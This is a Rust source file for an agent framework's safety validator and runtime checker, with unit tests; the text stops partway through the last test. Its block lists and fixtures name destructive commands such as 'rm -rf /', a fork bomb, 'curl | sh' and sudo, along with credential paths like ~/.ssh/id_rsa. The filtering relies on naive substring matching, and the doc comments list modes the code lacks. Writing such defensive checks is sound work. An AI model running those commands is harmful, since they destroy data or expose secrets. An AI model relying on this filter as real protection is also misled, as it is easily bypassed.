//! # Safety Validator
//!
//! Pre-execution safety validation to prevent dangerous operations before they occur.
//!
//! The safety validator analyzes missions for security risks, resource abuse,
//! and policy violations before execution begins.
//!
//! ## Safety Checks
//!
//! - **Path Traversal**: Detect `..` and `~` in file paths
//! - **Command Injection**: Validate shell commands for dangerous patterns
//! - **Resource Limits**: Check timeout values and step counts
//! - **Dangerous Operations**: Block known-dangerous commands (rm -rf, etc.)
//! - **Network Safety**: Validate URLs and protocols
//!
//! ## Validation Modes
//!
//! - `Strict`: Block on any safety violation (production)
//! - `Warn`: Log warnings but allow execution (development)
//! - `Off`: Skip validation (not recommended)
//!
//! ## Example
//!
//! ```rust
//! use rustchain::safety::{SafetyValidator, ValidationMode};
//! use rustchain::engine::Mission;
//!
//! # async fn example(mission: Mission) -> anyhow::Result<()> {
//! let validator = SafetyValidator::new();
//!
//! let result = validator.validate_mission(&mission, ValidationMode::Strict)?;
//!
//! if !result.is_safe {
//!     eprintln!("Safety violations found:");
//!     for issue in &result.issues {
//!         eprintln!("  - {}: {}", issue.severity, issue.message);
//!     }
//!     return Err(anyhow::anyhow!("Mission failed safety validation"));
//! }
//!
//! println!("Mission passed safety validation (risk score: {})", result.risk_score);
//! # Ok(())
//! # }
//! ```
//!
//! ## Risk Scoring
//!
//! Each safety issue contributes to a cumulative risk score:
//!
//! - **Critical**: 100 points (immediate block)
//! - **High**: 50 points
//! - **Medium**: 25 points
//! - **Low**: 10 points
//!
//! Missions with risk scores over threshold are blocked in Strict mode.
//!
//! ## Integration
//!
//! The safety validator is accessible via RuntimeContext:
//!
//! ```rust
//! use rustchain::safety::SafetyValidator;
//!
//! let validator = SafetyValidator::new();
//!
//! // Use validator to check missions before execution
//! ```
//!
//! ## Custom Rules
//!
//! You can add custom safety rules:
//!
//! ```rust
//! use rustchain::safety::{SafetyValidator, SafetyRule};
//!
//! let mut validator = SafetyValidator::new();
//! # let custom_rules = Vec::new();
//!
//! let validator_with_custom = SafetyValidator::with_rules(custom_rules);
//! ```

use crate::assert_invariant;
use crate::engine::Mission;
use anyhow::{anyhow, Result};
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use tracing::{debug, info};

/// Safety validator for mission execution
pub struct SafetyValidator {
    rules: Vec<SafetyRule>,
}

impl SafetyValidator {
    pub fn new() -> Self {
        Self {
            rules: Self::default_rules(),
        }
    }

    pub fn with_rules(rules: Vec<SafetyRule>) -> Self {
        Self { rules }
    }

    pub fn validate_mission(
        &self,
        mission: &Mission,
        mode: ValidationMode,
    ) -> Result<ValidationResult> {
        assert_invariant!(
            !mission.name.is_empty(),
            "Mission name cannot be empty",
            Some("safety")
        );
        assert_invariant!(
            !mission.steps.is_empty(),
            "Mission must have at least one step",
            Some("safety")
        );

        let mut issues = Vec::new();
        let mut risk_score = 0;
        let mut metadata = HashMap::new();

        debug!("Validating mission '{}' in {:?} mode", mission.name, mode);

        // Check mission-level safety
        for rule in &self.rules {
            if rule.applies_to_mission(mission) {
                let rule_result = rule.validate(mission, &mode);
                if let Some(issue) = rule_result.issue {
                    issues.push(issue);
                    risk_score += rule_result.risk_contribution;
                }
            }
        }

        // Check each step
        for step in &mission.steps {
            // Check for dangerous operations
            match step.step_type {
                crate::engine::StepType::Command => {
                    if let Some(cmd) = step.parameters.get("command").and_then(|v| v.as_str()) {
                        if Self::is_dangerous_command(cmd) {
                            issues.push(SafetyIssue {
                                severity: IssueSeverity::Critical,
                                message: format!("Dangerous command detected: {}", cmd),
                                step_id: Some(step.id.clone()),
                                rule_id: Some("dangerous_command".to_string()),
                            });
                            risk_score += 30;
                        }
                    }
                }
                crate::engine::StepType::DeleteFile => {
                    if let Some(path) = step.parameters.get("path").and_then(|v| v.as_str()) {
                        if Self::is_critical_path(path) {
                            issues.push(SafetyIssue {
                                severity: IssueSeverity::Critical,
                                message: format!("Attempting to delete critical path: {}", path),
                                step_id: Some(step.id.clone()),
                                rule_id: Some("critical_path".to_string()),
                            });
                            risk_score += 50;
                        }
                    }
                }
                crate::engine::StepType::Http => {
                    if let Some(url) = step.parameters.get("url").and_then(|v| v.as_str()) {
                        if !Self::is_safe_url(url) {
                            issues.push(SafetyIssue {
                                severity: IssueSeverity::Warning,
                                message: format!("Potentially unsafe URL: {}", url),
                                step_id: Some(step.id.clone()),
                                rule_id: Some("unsafe_url".to_string()),
                            });
                            risk_score += 15;
                        }
                    }
                }
                _ => {}
            }

            // Check for missing timeouts
            if step.timeout_seconds.is_none() && matches!(mode, ValidationMode::Strict) {
                issues.push(SafetyIssue {
                    severity: IssueSeverity::Info,
                    message: format!("Step {} has no timeout specified", step.id),
                    step_id: Some(step.id.clone()),
                    rule_id: Some("missing_timeout".to_string()),
                });
                risk_score += 5;
            }
        }

        // Add metadata
        metadata.insert("total_steps".to_string(), mission.steps.len().to_string());
        metadata.insert("validation_mode".to_string(), format!("{:?}", mode));
        metadata.insert("rules_applied".to_string(), self.rules.len().to_string());

        // Determine if safe based on mode and risk score
        let is_safe = match mode {
            ValidationMode::Permissive => risk_score < 80,
            ValidationMode::Standard => risk_score < 50,
            ValidationMode::Strict => {
                risk_score < 20
                    && !issues
                        .iter()
                        .any(|i| matches!(i.severity, IssueSeverity::Critical))
            }
        };

        info!(
            "Mission validation complete: safe={}, risk_score={}, issues={}",
            is_safe,
            risk_score,
            issues.len()
        );

        Ok(ValidationResult {
            is_safe,
            risk_score,
            issues,
            metadata,
        })
    }

    fn default_rules() -> Vec<SafetyRule> {
        vec![
            SafetyRule {
                id: "no_rm_rf".to_string(),
                name: "No rm -rf".to_string(),
                description: "Prevents deletion of entire directories".to_string(),
                severity: IssueSeverity::Critical,
                applies_to: vec!["command".to_string()],
            },
            SafetyRule {
                id: "no_sudo".to_string(),
                name: "No sudo commands".to_string(),
                description: "Prevents privilege escalation".to_string(),
                severity: IssueSeverity::Critical,
                applies_to: vec!["command".to_string()],
            },
            SafetyRule {
                id: "no_system_paths".to_string(),
                name: "No system path modification".to_string(),
                description: "Prevents modification of system directories".to_string(),
                severity: IssueSeverity::Critical,
                applies_to: vec![
                    "create_file".to_string(),
                    "edit_file".to_string(),
                    "delete_file".to_string(),
                ],
            },
            SafetyRule {
                id: "timeout_required".to_string(),
                name: "Timeout required".to_string(),
                description: "All steps should have timeouts".to_string(),
                severity: IssueSeverity::Warning,
                applies_to: vec!["*".to_string()],
            },
        ]
    }

    fn is_dangerous_command(command: &str) -> bool {
        let dangerous = [
            "rm -rf",
            "sudo",
            "su",
            "chmod 777",
            "mkfs",
            "dd if=",
            "format",
            ":(){:|:&};:", // Fork bomb
            "curl | sh",
            "wget | sh",
            "eval",
        ];

        let cmd_lower = command.to_lowercase();
        dangerous.iter().any(|&d| cmd_lower.contains(d))
    }

    fn is_critical_path(path: &str) -> bool {
        let critical = [
            "/etc",
            "/bin",
            "/sbin",
            "/usr/bin",
            "/usr/sbin",
            "/boot",
            "/lib",
            "/lib64",
            "/sys",
            "/proc",
            "C:\\Windows",
            "C:\\Program Files",
            "~/.ssh",
            "~/.aws",
        ];

        critical.iter().any(|&c| path.starts_with(c))
    }

    fn is_safe_url(url: &str) -> bool {
        // Check for localhost and private IPs
        if url.contains("localhost")
            || url.contains("127.0.0.1")
            || url.contains("192.168.")
            || url.contains("10.")
            || url.contains("172.16.")
        {
            return true;
        }

        // Check for HTTPS
        if !url.starts_with("https://") && !url.starts_with("http://localhost") {
            return false;
        }

        true
    }
}

/// Safety rule definition
#[derive(Clone, Debug, Serialize, Deserialize)]
pub struct SafetyRule {
    pub id: String,
    pub name: String,
    pub description: String,
    pub severity: IssueSeverity,
    pub applies_to: Vec<String>,
}

impl SafetyRule {
    pub fn applies_to_mission(&self, mission: &Mission) -> bool {
        // Check if this rule applies to any steps in the mission
        if self.applies_to.contains(&"*".to_string()) {
            return true;
        }

        mission.steps.iter().any(|step| {
            let step_type = format!("{:?}", step.step_type).to_lowercase();
            self.applies_to
                .iter()
                .any(|t| t.to_lowercase() == step_type)
        })
    }

    pub fn validate(&self, mission: &Mission, _mode: &ValidationMode) -> RuleResult {
        // Implement actual validation logic based on rule type
        match self.id.as_str() {
            "no_rm_rf" => {
                // Check for rm -rf commands
                for step in &mission.steps {
                    if let Some(cmd) = step.parameters.get("command").and_then(|v| v.as_str()) {
                        if cmd.contains("rm -rf") || cmd.contains("rm -r") {
                            return RuleResult {
                                rule_id: self.id.clone(),
                                passed: false,
                                issue: Some(SafetyIssue {
                                    severity: IssueSeverity::Critical,
                                    message: format!("Dangerous rm command detected: {}", cmd),
                                    step_id: Some(step.id.clone()),
                                    rule_id: Some(self.id.clone()),
                                }),
                                risk_contribution: 100,
                            };
                        }
                    }
                }
            }
            "no_sudo" => {
                // Check for sudo commands
                for step in &mission.steps {
                    if let Some(cmd) = step.parameters.get("command").and_then(|v| v.as_str()) {
                        if cmd.contains("sudo") {
                            return RuleResult {
                                rule_id: self.id.clone(),
                                passed: false,
                                issue: Some(SafetyIssue {
                                    severity: IssueSeverity::Critical,
                                    message: format!("Privilege escalation detected: {}", cmd),
                                    step_id: Some(step.id.clone()),
                                    rule_id: Some(self.id.clone()),
                                }),
                                risk_contribution: 100,
                            };
                        }
                    }
                }
            }
            "no_system_paths" => {
                // Check for system path modifications
                for step in &mission.steps {
                    if let Some(path) = step.parameters.get("path").and_then(|v| v.as_str()) {
                        if Self::is_critical_path(path) {
                            return RuleResult {
                                rule_id: self.id.clone(),
                                passed: false,
                                issue: Some(SafetyIssue {
                                    severity: IssueSeverity::Critical,
                                    message: format!("System path modification detected: {}", path),
                                    step_id: Some(step.id.clone()),
                                    rule_id: Some(self.id.clone()),
                                }),
                                risk_contribution: 100,
                            };
                        }
                    }
                }
            }
            "timeout_required" => {
                // Check for missing timeouts
                for step in &mission.steps {
                    if step.timeout_seconds.is_none() {
                        return RuleResult {
                            rule_id: self.id.clone(),
                            passed: false,
                            issue: Some(SafetyIssue {
                                severity: IssueSeverity::Warning,
                                message: format!("Step '{}' missing timeout", step.id),
                                step_id: Some(step.id.clone()),
                                rule_id: Some(self.id.clone()),
                            }),
                            risk_contribution: 10,
                        };
                    }
                }
            }
            _ => {
                // Unknown rule - pass by default
            }
        }

        RuleResult {
            rule_id: self.id.clone(),
            passed: true,
            issue: None,
            risk_contribution: 0,
        }
    }

    /// Check if a path is considered critical/system path
    pub fn is_critical_path(path: &str) -> bool {
        let critical_paths = [
            "/etc",
            "/usr",
            "/bin",
            "/sbin",
            "/boot",
            "/sys",
            "/proc",
            "/dev",
            "/root",
            "/var/log",
            "C:\\Windows",
            "C:\\Program Files",
            "C:\\Program Files (x86)",
            "C:\\System32",
        ];

        critical_paths
            .iter()
            .any(|critical| path.starts_with(critical))
    }
}

/// Result of a rule validation
#[derive(Debug)]
pub struct RuleResult {
    pub rule_id: String,
    pub passed: bool,
    pub issue: Option<SafetyIssue>,
    pub risk_contribution: u32,
}

/// Validation mode
#[derive(Debug, Clone, Copy, Serialize, Deserialize)]
pub enum ValidationMode {
    /// Allow most operations, only block critical issues
    Permissive,
    /// Standard safety checks
    Standard,
    /// Strict validation, fail on warnings
    Strict,
}

/// Result of safety validation
#[derive(Debug, Serialize, Deserialize)]
pub struct ValidationResult {
    pub is_safe: bool,
    pub risk_score: u32,
    pub issues: Vec<SafetyIssue>,
    pub metadata: HashMap<String, String>,
}

/// Type alias for safety reports (same as ValidationResult)
pub type SafetyReport = ValidationResult;

/// Safety issue found during validation
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SafetyIssue {
    pub severity: IssueSeverity,
    pub message: String,
    pub step_id: Option<String>,
    pub rule_id: Option<String>,
}

/// Issue severity levels
#[derive(Debug, Clone, Copy, Serialize, Deserialize)]
pub enum IssueSeverity {
    Critical,
    Warning,
    Info,
}

impl std::fmt::Display for IssueSeverity {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Critical => write!(f, "CRITICAL"),
            Self::Warning => write!(f, "WARNING"),
            Self::Info => write!(f, "INFO"),
        }
    }
}

/// Safety checker for runtime operations
pub struct SafetyChecker {
    allow_network: bool,
    allow_filesystem: bool,
    allow_commands: bool,
    max_file_size: usize,
    blocked_domains: Vec<String>,
}

impl SafetyChecker {
    pub fn new() -> Self {
        Self {
            allow_network: false,
            allow_filesystem: true,
            allow_commands: false,
            max_file_size: 10 * 1024 * 1024, // 10MB
            blocked_domains: vec!["malware.com".to_string(), "phishing.net".to_string()],
        }
    }

    pub fn check_network_access(&self, url: &str) -> Result<()> {
        assert_invariant!(!url.is_empty(), "URL cannot be empty", Some("safety"));

        if !self.allow_network {
            return Err(anyhow!("Network access is disabled"));
        }

        for domain in &self.blocked_domains {
            if url.contains(domain) {
                return Err(anyhow!("Access to {} is blocked", domain));
            }
        }

        Ok(())
    }

    pub fn check_filesystem_access(&self, path: &str, operation: FileOperation) -> Result<()> {
        assert_invariant!(!path.is_empty(), "Path cannot be empty", Some("safety"));

        if !self.allow_filesystem {
            return Err(anyhow!("Filesystem access is disabled"));
        }

        // Check for sensitive paths
        if SafetyValidator::is_critical_path(path) {
            return Err(anyhow!("Access to critical path {} is denied", path));
        }

        match operation {
            FileOperation::Read => Ok(()),
            FileOperation::Write(size) => {
                if size > self.max_file_size {
                    Err(anyhow!(
                        "File size {} exceeds maximum allowed {}",
                        size,
                        self.max_file_size
                    ))
                } else {
                    Ok(())
                }
            }
            FileOperation::Delete => {
                // Extra checks for deletion
                if path.contains("*") || path.contains("..") {
                    Err(anyhow!("Wildcard or parent directory deletion not allowed"))
                } else {
                    Ok(())
                }
            }
        }
    }

    pub fn check_command_execution(&self, command: &str) -> Result<()> {
        assert_invariant!(
            !command.is_empty(),
            "Command cannot be empty",
            Some("safety")
        );

        if !self.allow_commands {
            return Err(anyhow!("Command execution is disabled"));
        }

        if SafetyValidator::is_dangerous_command(command) {
            return Err(anyhow!("Dangerous command blocked: {}", command));
        }

        Ok(())
    }
}

/// File operation types for safety checking
#[derive(Debug, Clone)]
pub enum FileOperation {
    Read,
    Write(usize),
    Delete,
}

impl Default for SafetyChecker {
    fn default() -> Self {
        Self::new()
    }
}

impl Default for SafetyValidator {
    fn default() -> Self {
        Self::new()
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::engine::{Mission, MissionStep, StepType};
    use serde_json::json;

    fn create_test_mission() -> Mission {
        Mission {
            name: "test_mission".to_string(),
            description: Some("Test mission for safety validation".to_string()),
            version: "1.0".to_string(),
            steps: vec![MissionStep {
                id: "step1".to_string(),
                name: "Safe step".to_string(),
                step_type: StepType::CreateFile,
                parameters: json!({
                    "path": "/tmp/safe_file.txt",
                    "content": "Safe content"
                }),
                timeout_seconds: Some(30),
                continue_on_error: None,
                depends_on: None,
            }],
            config: None,
        }
    }

    fn create_dangerous_mission() -> Mission {
        Mission {
            name: "dangerous_mission".to_string(),
            description: Some("Dangerous mission for testing".to_string()),
            version: "1.0".to_string(),
            steps: vec![MissionStep {
                id: "dangerous_step".to_string(),
                name: "Dangerous step".to_string(),
                step_type: StepType::Command,
                parameters: json!({
                    "command": "rm -rf /"
                }),
                timeout_seconds: None,
                continue_on_error: None,
                depends_on: None,
            }],
            config: None,
        }
    }

    #[test]
    fn test_safety_validator_creation() {
        let validator = SafetyValidator::new();
        assert!(!validator.rules.is_empty());

        let custom_rules = vec![SafetyRule {
            id: "custom_rule".to_string(),
            name: "Custom Rule".to_string(),
            description: "A custom safety rule".to_string(),
            severity: IssueSeverity::Warning,
            applies_to: vec!["command".to_string()],
        }];

        let custom_validator = SafetyValidator::with_rules(custom_rules);
        assert_eq!(custom_validator.rules.len(), 1);
        assert_eq!(custom_validator.rules[0].id, "custom_rule");
    }

    #[test]
    fn test_safe_mission_validation() {
        let validator = SafetyValidator::new();
        let mission = create_test_mission();

        let result = validator
            .validate_mission(&mission, ValidationMode::Standard)
            .unwrap();

        assert!(result.is_safe);
        assert!(result.risk_score < 50);
        assert!(
            result.issues.is_empty()
                || result
                    .issues
                    .iter()
                    .all(|i| !matches!(i.severity, IssueSeverity::Critical))
        );
        assert!(result.metadata.contains_key("total_steps"));
        assert_eq!(result.metadata.get("total_steps"), Some(&"1".to_string()));
    }

    #[test]
    fn test_dangerous_mission_validation() {
        let validator = SafetyValidator::new();
        let mission = create_dangerous_mission();

        let result = validator
            .validate_mission(&mission, ValidationMode::Standard)
            .unwrap();

        // The mission should be flagged as unsafe due to dangerous command
        assert!(!result.is_safe || result.risk_score >= 30);
        assert!(!result.issues.is_empty());

        // Check that dangerous command was detected
        assert!(result
            .issues
            .iter()
            .any(|i| i.message.contains("rm -rf") || i.message.contains("Dangerous command")));
    }

    #[test]
    fn test_validation_modes() {
        let validator = SafetyValidator::new();
        let mission = Mission {
            name: "medium_risk_mission".to_string(),
            description: Some("Mission with medium risk".to_string()),
            version: "1.0".to_string(),
            steps: vec![MissionStep {
                id: "http_step".to_string(),
                name: "HTTP step".to_string(),
                step_type: StepType::Http,
                parameters: json!({
                    "url": "http://example.com"
                }),
                timeout_seconds: None,
                continue_on_error: None,
                depends_on: None,
            }],
            config: None,
        };

        // Permissive mode should allow medium risk
        let permissive_result = validator
            .validate_mission(&mission, ValidationMode::Permissive)
            .unwrap();
        assert!(permissive_result.is_safe);

        // Standard mode might allow it too (depending on risk score)
        let _standard_result = validator
            .validate_mission(&mission, ValidationMode::Standard)
            .unwrap();

        // Strict mode should be more restrictive
        let strict_result = validator
            .validate_mission(&mission, ValidationMode::Strict)
            .unwrap();
        assert!(strict_result
            .issues
            .iter()
            .any(|i| i.message.contains("timeout")));
    }

    #[test]
    fn test_critical_path_detection() {
        let validator = SafetyValidator::new();
        let mission = Mission {
            name: "path_test".to_string(),
            description: Some("Test critical path detection".to_string()),
            version: "1.0".to_string(),
            steps: vec![MissionStep {
                id: "delete_critical".to_string(),
                name: "Delete critical file".to_string(),
                step_type: StepType::DeleteFile,
                parameters: json!({
                    "path": "/etc/passwd"
                }),
                timeout_seconds: Some(30),
                continue_on_error: None,
                depends_on: None,
            }],
            config: None,
        };

        let result = validator
            .validate_mission(&mission, ValidationMode::Standard)
            .unwrap();

        assert!(!result.is_safe);
        assert!(result
            .issues
            .iter()
            .any(|i| i.message.contains("/etc/passwd")));
        assert!(result
            .issues
            .iter()
            .any(|i| matches!(i.severity, IssueSeverity::Critical)));
    }

    #[test]
    fn test_unsafe_url_detection() {
        let validator = SafetyValidator::new();
        let mission = Mission {
            name: "url_test".to_string(),
            description: Some("Test URL safety".to_string()),
            version: "1.0".to_string(),
            steps: vec![MissionStep {
                id: "unsafe_http".to_string(),
                name: "Unsafe HTTP".to_string(),
                step_type: StepType::Http,
                parameters: json!({
                    "url": "http://malicious-site.com"
                }),
                timeout_seconds: Some(30),
                continue_on_error: None,
                depends_on: None,
            }],
            config: None,
        };

        let result = validator
            .validate_mission(&mission, ValidationMode::Standard)
            .unwrap();

        assert!(result
            .issues
            .iter()
            .any(|i| i.message.contains("unsafe URL")));
    }

    #[test]
    fn test_timeout_validation_strict_mode() {
        let validator = SafetyValidator::new();
        let mission = Mission {
            name: "no_timeout_mission".to_string(),
            description: Some("Mission without timeouts".to_string()),
            version: "1.0".to_string(),
            steps: vec![MissionStep {
                id: "no_timeout_step".to_string(),
                name: "No timeout step".to_string(),
                step_type: StepType::CreateFile,
                parameters: json!({
                    "path": "/tmp/file.txt",
                    "content": "content"
                }),
                timeout_seconds: None,
                continue_on_error: None,
                depends_on: None,
            }],
            config: None,
        };

        let strict_result = validator
            .validate_mission(&mission, ValidationMode::Strict)
            .unwrap();
        assert!(strict_result
            .issues
            .iter()
            .any(|i| i.message.contains("no timeout")));

        let _standard_result = validator
            .validate_mission(&mission, ValidationMode::Standard)
            .unwrap();
        // Standard mode might not flag missing timeouts
    }

    #[test]
    fn test_is_dangerous_command() {
        assert!(SafetyValidator::is_dangerous_command("rm -rf /"));
        assert!(SafetyValidator::is_dangerous_command("sudo something"));
        assert!(SafetyValidator::is_dangerous_command("chmod 777 file"));
        assert!(SafetyValidator::is_dangerous_command("curl | sh"));
        assert!(SafetyValidator::is_dangerous_command(":(){:|:&};:"));

        assert!(!SafetyValidator::is_dangerous_command("ls -la"));
        assert!(!SafetyValidator::is_dangerous_command("cat file.txt"));
        assert!(!SafetyValidator::is_dangerous_command("echo hello"));
    }

    #[test]
    fn test_is_critical_path() {
        assert!(SafetyValidator::is_critical_path("/etc/passwd"));
        assert!(SafetyValidator::is_critical_path("/bin/bash"));
        assert!(SafetyValidator::is_critical_path("/usr/bin/python"));
        assert!(SafetyValidator::is_critical_path("C:\\Windows\\System32"));
        assert!(SafetyValidator::is_critical_path("~/.ssh/id_rsa"));

        assert!(!SafetyValidator::is_critical_path("/tmp/file.txt"));
        assert!(!SafetyValidator::is_critical_path(
            "/home/user/document.txt"
        ));
        assert!(!SafetyValidator::is_critical_path("./local_file.txt"));
    }

    #[test]
    fn test_is_safe_url() {
        assert!(SafetyValidator::is_safe_url("https://example.com"));
        assert!(SafetyValidator::is_safe_url("http://localhost:8080"));
        assert!(SafetyValidator::is_safe_url("https://127.0.0.1:3000"));
        assert!(SafetyValidator::is_safe_url("https://192.168.1.100"));

        assert!(!SafetyValidator::is_safe_url("http://malicious.com"));
        assert!(!SafetyValidator::is_safe_url("ftp://example.com"));
    }

    #[test]
    fn test_safety_rule_applies_to_mission() {
        let rule = SafetyRule {
            id: "command_rule".to_string(),
            name: "Command Rule".to_string(),
            description: "Applies to command steps".to_string(),
            severity: IssueSeverity::Warning,
            applies_to: vec!["command".to_string()],
        };

        let command_mission = Mission {
            name: "command_mission".to_string(),
            description: Some("Mission with command step".to_string()),
            version: "1.0".to_string(),
            steps: vec![MissionStep {
                id: "cmd_step".to_string(),
                name: "Command step".to_string(),
                step_type: StepType::Command,
                parameters: json!({"command": "ls"}),
                timeout_seconds: Some(30),
                continue_on_error: None,
                depends_on: None,
            }],
            config: None,
        };

        let file_mission = Mission {
            name: "file_mission".to_string(),
            description: Some("Mission with file step".to_string()),
            version: "1.0".to_string(),
            steps: vec![MissionStep {
                id: "file_step".to_string(),
                name: "File step".to_string(),
                step_type: StepType::CreateFile,
                parameters: json!({"path": "/tmp/file.txt", "content": "test"}),
                timeout_seconds: Some(30),
                continue_on_error: None,
                depends_on: None,
            }],
            config: None,
        };

        assert!(rule.applies_to_mission(&command_mission));
        assert!(!rule.applies_to_mission(&file_mission));

        // Test universal rule
        let universal_rule = SafetyRule {
            id: "universal_rule".to_string(),
            name: "Universal Rule".to_string(),
            description: "Applies to all steps".to_string(),
            severity: IssueSeverity::Info,
            applies_to: vec!["*".to_string()],
        };

        assert!(universal_rule.applies_to_mission(&command_mission));
        assert!(universal_rule.applies_to_mission(&file_mission));
    }

    #[test]
    fn test_safety_checker_creation() {
        let checker = SafetyChecker::new();
        assert!(!checker.allow_network);
        assert!(checker.allow_filesystem);
        assert!(!checker.allow_commands);
        assert_eq!(checker.max_file_size, 10 * 1024 * 1024);
        assert!(!checker.blocked_domains.is_empty());

        let default_checker = SafetyChecker::default();
        assert!(!default_checker.allow_network);
    }

    #[test]
    fn test_safety_checker_network_access() {
        let mut checker = SafetyChecker::new();

        // Network disabled by default
        let result = checker.check_network_access("https://example.com");
        assert!(result.is_err());
        assert!(result
            .unwrap_err()
            .to_string()
            .contains("Network access is disabled"));

        // Enable network access
        checker.allow_network = true;

        // Should allow safe URLs
        assert!(checker.check_network_access("https://example.com").is_ok());

        // Should block malicious domains
        let blocked_result = checker.check_network_access("https://malware.com/evil");
        assert!(blocked_result.is_err());
        assert!(blocked_result.unwrap_err().to_string().contains("blocked"));
    }

    #[test]
    fn test_safety_checker_filesystem_access() {
        let checker = SafetyChecker::new();

        // Should allow safe file operations
        assert!(checker
            .check_filesystem_access("/tmp/safe_file.txt", FileOperation::Read)
            .is_ok());
        assert!(checker
            .check_filesystem_access("/home/user/document.txt", FileOperation::Write(1024))
            .is_ok());

        // Should block critical paths
        let critical_result = checker.check_filesystem_access("/etc/passwd", FileOperation::Read);
        assert!(critical_result.is_err());
        assert!(critical_result
            .unwrap_err()
            .to_string()
            .contains("critical path"));

        // Should block large files
        let large_file_result = checker
            .check_filesystem_access("/tmp/huge.txt", FileOperation::Write(50 * 1024 * 1024));
        assert!(large_file_result.is_err());
        assert!(large_file_result
            .unwrap_err()
            .to_string()
            .contains("exceeds maximum"));

        // Should block wildcard deletion
        let wildcard_result = checker.check_filesystem_access("/tmp/*", FileOperation::Delete);
        assert!(wildcard_result.is_err());
        assert!(wildcard_result
            .unwrap_err()
            .to_string()
            .contains("Wildcard"));

        // Should block parent directory traversal
        let traversal_result =
            checker.check_filesystem_access("../../../etc/passwd", FileOperation::Delete);
        assert!(traversal_result.is_err());
        assert!(traversal_result
            .unwrap_err()
            .to_string()
            .contains("parent directory"));
    }

    #[test]
    fn test_safety_checker_filesystem_disabled() {
        let mut checker = SafetyChecker::new();
        checker.allow_filesystem = false;

        let result = checker.check_filesystem_access("/tmp/file.txt", FileOperation::Read);
        assert!(result.is_err());
        assert!(result
            .unwrap_err()
            .to_string()
            .contains("Filesystem access is disabled"));
    }

    #[test]
    fn test_safety_checker_command_execution() {
        let mut checker = SafetyChecker::new();

        // Commands disabled by default
        let result = checker.check_command_execution("ls -la");
        assert!(result.is_err());
        assert!(result
            .unwrap_err()
            .to_string()
            .contains("Command execution is disabled"));

        // Enable commands
        checker.allow_commands = true;

        // Should allow safe commands
        assert!(checker.check_command_execution("ls -la").is_ok());
        assert!(checker.check_command_execution("cat file.txt").is_ok());

        // Should block dangerous commands
        let dangerous_result = checker.check_command_execution("rm -rf /");
        assert!(dangerous_result.is_err());
        assert!(dangerous_result
            .unwrap_err()
            .to_string()
            .contains("Dangerous command blocked"));

        let sudo_result = checker.check_command_execution("sudo apt install malware");
        assert!(sudo_result.is_err());
        assert!(sudo_result
            .unwrap_err()
            .to_string()
            .contains("Dangerous command blocked"));
    }

    #[test]
    fn test_issue_severity_display() {
        assert_eq!(format!("{}", IssueSeverity::Critical), "CRITICAL");
        assert_eq!(format!("{}", IssueSeverity::Warning), "WARNING");
        assert_eq!(format!("{}", IssueSeverity::Info), "INFO");
    }

    #[test]
    fn test_validation_result_serialization() {
        let result = ValidationResult {
            is_safe: false,
            risk_score: 75,
            issues: vec![SafetyIssue {
                severity: IssueSeverity::Critical,
                message: "Dangerous operation detected".to_string(),
                step_id: Some("step1".to_string()),
                rule_id: Some("rule1".to_string()),
            }],
            metadata: {
                let mut map = HashMap::new();
                map.insert("test_key".to_string(), "test_value".to_string());
                map
            },
        };

        let serialized = serde_json::to_string(&result).unwrap();
        let deserialized: ValidationResult = serde_json::from_str(&serialized).unwrap();

        assert_eq!(result.is_safe, deserialized.is_safe);
        assert_eq!(result.risk_score, deserialized.risk_score);
        assert_eq!(result.issues.len(), deserialized.issues.len());
        assert_eq!(result.metadata.len(), deserialized.metadata.len());
    }

    #[test]
    fn test_safety_issue_creation() {
        let issue = SafetyIssue {
            severity: IssueSeverity::Warning,
            message: "Potential security risk".to_string(),
            step_id: Some("risky_step".to_string()),
            rule_id: Some("security_rule".to_string()),
        };

        assert!(matches!(issue.severity, IssueSeverity::Warning));
        assert_eq!(issue.message, "Potential security risk");
        assert_eq!(issue.step_id, Some("risky_step".to_string()));
        assert_eq!(issue.rule_id, Some("security_rule".to_string()));
    }

    #[test]
    fn test_file_operation_types() {
        let read_op = FileOperation::Read;
        let write_op = FileOperation::Write(1024);
        let delete_op = FileOperation::Delete;

        match read_op {
            FileOperation::Read => {} // Expected variant
            _ => unreachable!("Should be Read operation"),
        }

        match write_op {
            FileOperation::Write(size) => assert_eq!(size, 1024),
            _ => unreachable!("Should be Write operation"),
        }

        match delete_op {
            FileOperation::Delete => {} // Expected variant
            _ => unreachable!("Should be Delete operation"),
        }
    }

    #[test]
    fn test_validation_mode_serialization() {
        let modes = [
            ValidationMode::Permissive,
            ValidationMode::Standard,
            ValidationMode::Strict,
        ];

        for mode in modes {
            let serialized = serde_json::to_string(&mode).unwrap();
            let deserialized: ValidationMode = serde_json::from_str(&serialized).unwrap();
            assert!(matches!(
                (mode, deserialized),
                (ValidationMode::Permissive, ValidationMode::Permissive)
                    | (ValidationMode::Standard, ValidationMode::Standard)
                    | (ValidationMode::Strict, ValidationMode::Strict)
            ));
        }
    }

    #[test]
    fn test_safety_rule_serialization() {
        let rule = SafetyRule {
            id: "test_rule".to_string(),
            name: "Test Rule".to_string(),
            description: "A test safety rule".to_string(),
            severity: IssueSeverity::Warning,
            applies_to: vec!["command".to_string(), "file".to_string()],
        };

        let serialized = serde_json::to_string(&rule).unwrap();
        let deserialized: SafetyRule = serde_json::from_str(&serialized).unwrap();

        assert_eq!(rule.id, deserialized.id);
        assert_eq!(rule.name, deserialized.name);
        assert_eq!(rule.description, deserialized.description);
        assert!(matches!(
            (rule.severity, deserialized.severity),
            (IssueSeverity::Warning, IssueSeverity::Warning)
        ));
        assert_eq!(rule.applies_to, deserialized.applies_to);
    }

    #[test]
    fn test_default_safety_rules() {
        let validator = SafetyValidator::new();
        let rules = &validator.rules;

        // Should have default safety rules
        assert!(!rules.is_empty());

        // Check for specific important rules
        assert!(rules.iter().any(|r| r.id == "no_rm_rf"));
        assert!(rules.iter().any(|r| r.id == "no_sudo"));
        assert!(rules.iter().any(|r| r.id == "no_system_paths"));
        assert!(rules.iter().any(|r| r.id == "timeout_required"));

        // All rules should have proper structure
        for rule in rules {
            assert!(!rule.id.is_empty());
            assert!(!rule.name.is_empty());
            assert!(!rule.description.is_empty());
            assert!(!rule.applies_to.is_empty());
        }
    }

    #[test]
    fn test_complex_mission_validation() {
        let validator = SafetyValidator::new();
        let complex_mission = Mission {
            name: "complex_mission".to_string(),
            description: Some("A complex mission with multiple steps".to_string()),
